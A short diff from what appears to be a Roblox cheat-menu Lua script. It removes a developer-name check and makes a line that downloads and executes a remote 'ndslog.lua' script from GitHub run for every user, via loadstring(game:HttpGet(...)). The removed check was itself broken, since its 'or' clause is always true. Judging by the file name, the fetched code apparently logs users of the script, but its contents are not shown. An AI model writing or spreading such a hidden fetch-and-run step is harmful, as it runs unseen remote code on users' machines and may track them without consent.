@@ -248,6 +248,4 @@ local Button = miscTab:CreateButton({
 	end,
 })
 
-if game.Players.LocalPlayer.Name ~= "IRateThisName10" or "DevAY001" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/ndslog.lua"))()
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/ndslog.lua"))()
